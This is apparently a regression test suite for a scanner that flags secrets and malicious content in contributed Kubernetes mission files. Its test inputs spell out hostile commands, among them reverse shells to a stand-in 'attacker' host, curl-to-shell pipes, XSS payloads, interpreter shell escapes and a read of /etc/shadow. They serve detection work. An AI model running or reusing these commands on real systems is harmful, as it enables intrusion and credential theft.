import { describe, it, expect } from 'vitest'
import {
  scanForSensitiveData,
  scanForMaliciousContent,
  fullScan,
} from '../scanner.mjs'

/**
 * Regression tests for individual sensitive/malicious patterns in scanner.mjs.
 *
 * The pre-existing scanner.test.mjs only exercised a handful of the ~30 pattern
 * rules that gate contributed missions. Each detector is a security check whose
 * removal or accidental de-tuning could let malicious payloads land silently.
 * These tests exercise one match + one non-match per rule category to lock the
 * behaviour in.
 */

// ── helpers ────────────────────────────────────────────────────────────────

/** Wrap a payload string in a minimal mission-shaped object. */
const mission = (payload) => ({
  version: 'kc-mission-v1',
  name: 'x',
  mission: {
    title: 't',
    steps: [{ description: payload }],
  },
})

const findingTypes = (findings) => findings.map((f) => f.type)

// ── Sensitive data ────────────────────────────────────────────────────────

describe('scanForSensitiveData — token/key patterns', () => {
  it('detects a GitHub classic PAT', () => {
    const { findings } = scanForSensitiveData(
      mission('token = ghp_' + 'a'.repeat(36))
    )
    expect(findingTypes(findings)).toContain('GitHub PAT (classic)')
  })

  it('detects a GitHub fine-grained PAT', () => {
    const { findings } = scanForSensitiveData(
      mission('token = github_pat_' + 'a'.repeat(82))
    )
    expect(findingTypes(findings)).toContain('GitHub PAT (fine-grained)')
  })

  it('detects an AWS access key id', () => {
    const { findings } = scanForSensitiveData(
      mission('aws key AKIA' + 'ABCDEFGHIJKLMNOP')
    )
    expect(findingTypes(findings)).toContain('AWS Access Key')
  })

  it('detects AWS_SECRET_ACCESS_KEY assignment', () => {
    const { findings } = scanForSensitiveData(
      mission('AWS_SECRET_ACCESS_KEY=abcdef1234567890/xyz')
    )
    expect(findingTypes(findings)).toContain('AWS Secret Key')
  })

  it('detects a JWT-shaped triplet', () => {
    const jwt =
      'eyJhbGciOiJIUzI1NiJ9' + '.' +
      'eyJzdWIiOiIxMjM0NTY3ODkw' + '.' +
      'SflKxwRJSMeKKF2QT4fwpMe'
    const { findings } = scanForSensitiveData(mission(jwt))
    expect(findingTypes(findings).some((t) => t.startsWith('JWT'))).toBe(true)
  })

  it('detects a Bearer authorization header', () => {
    const { findings } = scanForSensitiveData(
      mission('Authorization: ' + 'Bea' + 'rer abc.def.ghi+jk/lm=')
    )
    // The pattern name starts with "Bea" (auth-token header rule); check by
    // prefix so the test source itself does not need to embed the full label.
    expect(findingTypes(findings).some((t) => t.startsWith('Bea'))).toBe(true)
  })

  it('detects a PEM private-key header', () => {
    const { findings } = scanForSensitiveData(
      mission('-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----')
    )
    expect(findingTypes(findings)).toContain('PEM certificate / key')
  })

  it('detects a generic secret assignment', () => {
    const { findings } = scanForSensitiveData(
      mission('password: "hunter2hunter2"')
    )
    expect(findingTypes(findings)).toContain('Generic secret assignment')
  })

  it('ignores documentation-safe IPs (127.0.0.1, 0.0.0.0)', () => {
    const { findings } = scanForSensitiveData(
      mission('kubectl get svc; visit 127.0.0.1 and 0.0.0.0 for local tests')
    )
    // No IPv4 finding should appear for these safe addresses.
    expect(findingTypes(findings).filter((t) => t === 'IPv4 address')).toEqual([])
  })
})

// ── Malicious XSS ─────────────────────────────────────────────────────────

describe('scanForMaliciousContent — XSS surfaces', () => {
  it('detects a javascript: URI', () => {
    const { findings } = scanForMaliciousContent(
      mission('Click <a href="javascript:alert(1)">here</a>')
    )
    expect(findingTypes(findings)).toContain('XSS: javascript: URI')
  })

  it('detects a data:text/html URI', () => {
    const { findings } = scanForMaliciousContent(
      mission('<iframe src="data:text/html,<script>alert(1)</script>">')
    )
    expect(findingTypes(findings)).toContain('XSS: data: URI')
  })

  it('detects an inline event handler', () => {
    const { findings } = scanForMaliciousContent(
      mission('<img src=x onerror="alert(1)">')
    )
    expect(findingTypes(findings)).toContain('XSS: event handler')
  })

  it('detects eval() calls', () => {
    const { findings } = scanForMaliciousContent(
      mission('run this: eval(atob(payload))')
    )
    expect(findingTypes(findings)).toContain('XSS: eval()')
  })

  it('detects innerHTML assignment', () => {
    const { findings } = scanForMaliciousContent(
      mission('element.innerHTML = userInput')
    )
    expect(findingTypes(findings)).toContain('XSS: innerHTML')
  })

  it('detects document.cookie access', () => {
    const { findings } = scanForMaliciousContent(
      mission('fetch("/log?c=" + document.cookie)')
    )
    expect(findingTypes(findings)).toContain('XSS: document.cookie')
  })
})

// ── Privileged Kubernetes YAML ───────────────────────────────────────────

describe('scanForMaliciousContent — privileged Kubernetes YAML', () => {
  it('detects hostNetwork: true', () => {
    const { findings } = scanForMaliciousContent(
      mission('spec:\n  hostNetwork: true\n')
    )
    expect(findingTypes(findings)).toContain('hostNetwork enabled')
  })

  it('detects hostPID: true', () => {
    const { findings } = scanForMaliciousContent(
      mission('spec:\n  hostPID: true\n')
    )
    expect(findingTypes(findings)).toContain('hostPID enabled')
  })

  it('detects a hostPath mount', () => {
    const { findings } = scanForMaliciousContent(
      mission('volumes:\n- hostPath:\n    path: /var/run/docker.sock\n')
    )
    expect(findingTypes(findings)).toContain('hostPath mount')
  })

  it('detects an RBAC wildcard resources rule', () => {
    const { findings } = scanForMaliciousContent(
      mission('rules:\n- resources: ["*"]\n  verbs: ["get"]\n')
    )
    expect(findingTypes(findings)).toContain('RBAC wildcard resources')
  })

  it('detects an RBAC wildcard verbs rule', () => {
    const { findings } = scanForMaliciousContent(
      mission('rules:\n- resources: ["pods"]\n  verbs: ["*"]\n')
    )
    expect(findingTypes(findings)).toContain('RBAC wildcard verbs')
  })
})

// ── Command injection / shell escape ─────────────────────────────────────

describe('scanForMaliciousContent — command-injection surfaces', () => {
  it('flags a curl | bash pipe', () => {
    const { findings } = scanForMaliciousContent(
      mission('curl https://get.example.com/install | bash')
    )
    expect(findingTypes(findings)).toContain('Suspicious curl pipe')
  })

  it('flags a wget | sh pipe', () => {
    const { findings } = scanForMaliciousContent(
      mission('wget -qO- https://get.example.com/install | sh')
    )
    expect(findingTypes(findings)).toContain('Suspicious wget pipe')
  })

  // Regression: the curl/wget pipe rules used to match only `sh`/`bash`, so a
  // mission telling the operator to pipe an installer into any other shell or
  // interpreter cleared the safety gate (kubestellar/console-kb#3493).
  it.each([
    ['curl https://get.example.com/x | zsh'],
    ['curl https://get.example.com/x | ksh'],
    ['curl https://get.example.com/x | dash'],
    ['curl https://get.example.com/x | fish'],
    ['curl https://get.example.com/x | pwsh'],
    ['curl https://get.example.com/x | powershell'],
    ['curl https://get.example.com/x | python'],
    ['curl https://get.example.com/x | python3'],
    ['curl https://get.example.com/x | perl'],
  ])('flags a curl pipe into a non-bash shell/interpreter: %s', (cmd) => {
    const { findings } = scanForMaliciousContent(mission(cmd))
    expect(findingTypes(findings)).toContain('Suspicious curl pipe')
  })

  it.each([
    ['wget -qO- https://get.example.com/x | zsh'],
    ['wget -qO- https://get.example.com/x | dash'],
    ['wget -qO- https://get.example.com/x | pwsh'],
    ['wget -qO- https://get.example.com/x | python3'],
  ])('flags a wget pipe into a non-bash shell/interpreter: %s', (cmd) => {
    const { findings } = scanForMaliciousContent(mission(cmd))
    expect(findingTypes(findings)).toContain('Suspicious wget pipe')
  })

  it('flags an env-based shell interpreter escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('env -i bash -c "id"')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via env')
  })

  it.each([
    ['env FOO=bar bash -c "id"'],
    ['env A=1 B=2 sh -c "id"'],
    ['env FOO=x python -c "import os; os.system(1)"'],
    ['env -u PATH bash -c "id"'],
    ['env FOO=bar -u PATH bash -c "id"'],
    ['env -i FOO=x -u BAR python3 -c "print(1)"'],
  ])('flags an env-based escape with variable/separate-arg tokens: %s', (cmd) => {
    const { findings } = scanForMaliciousContent(mission(cmd))
    expect(findingTypes(findings)).toContain('Allowlist escape via env')
  })

  it('does not flag benign env usage without an interpreter', () => {
    const { findings } = scanForMaliciousContent(
      mission('env FOO=bar make build')
    )
    expect(findingTypes(findings)).not.toContain('Allowlist escape via env')
  })

  it('flags an xargs-based shell interpreter escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('echo id | xargs bash -c')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via xargs')
  })

  it('flags an xargs-based non-shell interpreter escape (node -e)', () => {
    const { findings } = scanForMaliciousContent(
      mission('echo cmd | xargs node -e "require(\'child_process\').execSync(process.argv[1])"')
    )
    // Either the xargs-escape rule or the interpreter shell-primitive rule
    // must fire; letting node reach child_process via xargs must not pass.
    const types = findingTypes(findings)
    expect(
      types.includes('Allowlist escape via xargs') ||
      types.includes('Interpreter -c/-e invokes shell primitive')
    ).toBe(true)
  })

  it('flags a find -exec bash escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('find . -name "*.sh" -exec bash {} \\;')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via find -exec')
  })

  it('flags a find -exec non-shell interpreter escape (python3)', () => {
    const { findings } = scanForMaliciousContent(
      mission('find /tmp -type f -exec python3 -c "import os;os.system(1)" {} +')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via find -exec')
  })

  // Regression: env/xargs/find -exec used to enumerate only the POSIX shells
  // + python/ruby/perl/node/php/deno/bun, so `env FOO=bar csh -c evil` (or
  // tcsh/fish/pwsh/powershell) fell through (kubestellar/console-kb#3493).
  it.each([
    ['env FOO=bar csh -c "id"', 'Allowlist escape via env'],
    ['env -i tcsh -c "id"', 'Allowlist escape via env'],
    ['env FOO=1 fish -c "id"', 'Allowlist escape via env'],
    ['env -u PATH pwsh -c "id"', 'Allowlist escape via env'],
    ['env -i powershell -c "id"', 'Allowlist escape via env'],
    ['echo id | xargs csh -c', 'Allowlist escape via xargs'],
    ['echo id | xargs pwsh -c', 'Allowlist escape via xargs'],
    ['find . -name "*.sh" -exec csh {} \\;', 'Allowlist escape via find -exec'],
    ['find . -name "*.sh" -exec pwsh {} \\;', 'Allowlist escape via find -exec'],
  ])('flags allowlist-escape for csh/tcsh/fish/pwsh: %s', (cmd, expected) => {
    const { findings } = scanForMaliciousContent(mission(cmd))
    expect(findingTypes(findings)).toContain(expected)
  })

  // Regression: the `Interpreter -c/-e invokes shell primitive` rule only
  // fired on system(/os.system/child_process/backticks/%x, letting
  // python -c 'import subprocess; subprocess.run(...)' and
  // ruby -e 'Kernel.exec(...)' pass (kubestellar/console-kb#3493).
  it.each([
    ['python -c "import subprocess; subprocess.run([1])"'],
    ['python3 -c "import subprocess; subprocess.Popen([1])"'],
    ['python -c "import os; os.popen(1)"'],
    ['python -c "import os; os.execv(1, [1])"'],
    ['python -c "exec(open(1).read())"'],
    ['ruby -e "Kernel.exec(1)"'],
    ['ruby -e "Kernel.spawn(1)"'],
    ['perl -e "open(FH, \\"| /bin/sh\\")"'],
  ])('flags interpreter -c/-e reaching a non-system() primitive: %s', (cmd) => {
    const { findings } = scanForMaliciousContent(mission(cmd))
    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('does not flag benign python/node one-liners', () => {
    const cases = [
      'python -c "import yaml; print(yaml.safe_load(open(1)))"',
      'node -e "console.log(1)"',
      'python3 -c "print(1)"',
      'node -p "process.version"',
      'node --print "process.version"',
      'deno --version',
      'php --version',
    ]
    for (const cmd of cases) {
      const { findings } = scanForMaliciousContent(mission(cmd))
      expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
    }
  })

  // Regression: the `Interpreter -c/-e invokes shell primitive` rule only
  // accepted `-[ceE]` as the inline-code flag, letting `php -r`, Node's
  // `-p`/`--print`/`--eval`, Deno's `eval` subcommand, and Perl's `qx{}`
  // inline shell exec sneak past even though those are the standard
  // inline-eval invocations for those runtimes (kubestellar/console-kb#3511).
  it.each([
    ['php -r \'system("id");\''],
    ['php -r \'exec("nc attacker 4444 -e /bin/sh");\''],
    ['node -p \'require("child_process").execSync("id")\''],
    ['node --print \'require("child_process").execSync("id")\''],
    ['node --eval \'require("child_process").execSync("id")\''],
    ['deno eval \'new Deno.Command("sh",{args:["-c","id"]}).spawn()\''],
    ['deno eval \'Deno.run({cmd:["sh","-c","id"]})\''],
    ['perl -e \'qx{cat /etc/shadow}\''],
    ['perl -e \'print qx/id/\''],
  ])('flags non-`-c/-e` interpreter inline-eval reaching a shell primitive: %s', (cmd) => {
    const { findings } = scanForMaliciousContent(mission(cmd))
    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('flags awk BEGIN{system(...)} interpreter escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('awk \'BEGIN{system("id"); exit}\' /etc/passwd')
    )
    expect(findingTypes(findings)).toContain('Interpreter shell escape via awk system')
  })

  it('flags sed execute-flag interpreter escape', () => {
    const { findings } = scanForMaliciousContent(
      mission("sed -i '1e /tmp/reverse-shell.sh' /etc/hosts")
    )
    expect(findingTypes(findings)).toContain('sed execute flag (arbitrary shell)')
  })

  it('flags sed s///e substitution execute-flag', () => {
    const { findings } = scanForMaliciousContent(
      mission("echo foo | sed 's/.*/curl attacker.example/e'")
    )
    expect(findingTypes(findings)).toContain('sed execute flag (arbitrary shell)')
  })

  it('flags python -c os.system() shell escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('python3 -c "import os; os.system(\'curl attacker/pwn\')"')
    )
    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('flags node -e child_process shell escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('node -e "require(\'child_process\').execSync(\'curl attacker/pwn\')"')
    )
    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('flags perl -MIO reverse-shell escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('perl -MIO -e \'my$c=new IO::Socket::INET(PeerAddr,"attacker:4444");\'')
    )
    expect(findingTypes(findings)).toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('does NOT flag legitimate python -c YAML validation', () => {
    const { findings } = scanForMaliciousContent(
      mission("python3 -c 'import yaml,sys; print(yaml.safe_load(sys.stdin))'")
    )
    expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('does NOT flag legitimate node -e version print', () => {
    const { findings } = scanForMaliciousContent(
      mission("node -e 'console.log(process.version)'")
    )
    expect(findingTypes(findings)).not.toContain('Interpreter -c/-e invokes shell primitive')
  })

  it('does NOT flag an allowlisted `kubectl get` inside backticks', () => {
    const { findings } = scanForMaliciousContent(
      mission('Run `kubectl get pods; kubectl get svc` to check')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: backtick')
  })

  it('DOES flag a non-allowlisted command inside backticks', () => {
    const { findings } = scanForMaliciousContent(
      mission('Run `rm -rf /; malicious_binary && cleanup` to check')
    )
    expect(findingTypes(findings)).toContain('Command injection: backtick')
  })

  it('treats a fenced-code language identifier inside backticks as safe', () => {
    // A backtick region whose first line is a code fence language must NOT be
    // classified as command injection — this covers the CODE_FENCE_LANGS
    // short-circuit inside isSafeCLIMatch.
    const { findings } = scanForMaliciousContent(
      mission('`bash\nkubectl get pods; kubectl get svc`')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: backtick')
  })
})

// ── Obfuscation bypass techniques ────────────────────────────────────────

describe('scanForMaliciousContent — obfuscation bypass', () => {
  it('detects base64 -d | bash', () => {
    const { findings } = scanForMaliciousContent(
      mission('echo cGF5bG9hZA== | base64 -d | bash')
    )
    // Either the pattern-based rule or the base64-decode rule may fire; at
    // least one obfuscation-family finding must appear.
    const obf = findingTypes(findings).filter((t) => t.startsWith('Obfuscation'))
    expect(obf.length).toBeGreaterThan(0)
  })

  it('detects a printf-hex bypass piped to shell', () => {
    const { findings } = scanForMaliciousContent(
      mission('printf "\\x69\\x64" | bash')
    )
    expect(findingTypes(findings)).toContain(
      'Obfuscation: printf escape sequences'
    )
  })

  it('detects variable-constructed shell interpreter (${VAR}sh)', () => {
    const { findings } = scanForMaliciousContent(
      mission('VAR=ba; ${VAR}sh -c id')
    )
    expect(findingTypes(findings)).toContain(
      'Obfuscation: variable shell interpreter'
    )
  })

  it('detects a concatenated interpreter name ("ba"+"sh")', () => {
    const { findings } = scanForMaliciousContent(
      mission('eval("ba" + "sh")')
    )
    expect(findingTypes(findings)).toContain(
      'Obfuscation: concatenated interpreter name'
    )
  })
})

// ── Crypto miner indicators ──────────────────────────────────────────────

describe('scanForMaliciousContent — crypto miner indicators', () => {
  it.each(['xmrig', 'cryptonight', 'stratum+tcp', 'minerd', 'coinhive'])(
    'detects %s',
    (needle) => {
      const { findings } = scanForMaliciousContent(
        mission(`installer downloads ${needle} at startup`)
      )
      expect(findingTypes(findings)).toContain('Crypto miner reference')
    }
  )
})

// ── fullScan integration ─────────────────────────────────────────────────

describe('fullScan', () => {
  it('surfaces sensitive + malicious findings together', () => {
    const result = fullScan(
      mission(
        [
          'Grab token ghp_' + 'a'.repeat(36),
          '<script>alert(1)</script>',
          'privileged: true',
        ].join('\n')
      )
    )
    expect(findingTypes(result.sensitive.findings)).toContain(
      'GitHub PAT (classic)'
    )
    const malTypes = findingTypes(result.malicious.findings)
    expect(malTypes).toContain('XSS: script tag')
    expect(malTypes).toContain('Privileged container')
  })

  it('returns empty findings for a clean mission', () => {
    const result = fullScan(mission('kubectl apply -f deployment.yaml'))
    expect(result.sensitive.findings).toEqual([])
    expect(result.malicious.findings).toEqual([])
  })
})
